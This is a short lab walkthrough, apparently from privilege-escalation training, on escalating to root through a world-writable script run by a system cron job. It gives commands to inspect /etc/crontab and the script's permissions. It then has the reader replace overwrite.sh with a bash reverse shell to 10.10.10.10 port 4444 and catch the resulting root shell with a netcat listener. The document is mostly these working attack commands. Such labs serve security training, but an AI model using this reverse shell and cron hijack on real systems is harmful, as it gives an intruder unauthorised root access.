# Cron Jobs - File Permissions

View the contents of the system-wide crontab:

`cat /etc/crontab`

Locate the full path of the overwrite.sh file:

`locate overwrite.sh`

Note that the file is world-writable:

`ls -l /usr/local/bin/overwrite.sh`

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

\#!/bin/bash\
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run. A root shell should connect back to your netcat listener.

`nc -nvlp 4444`
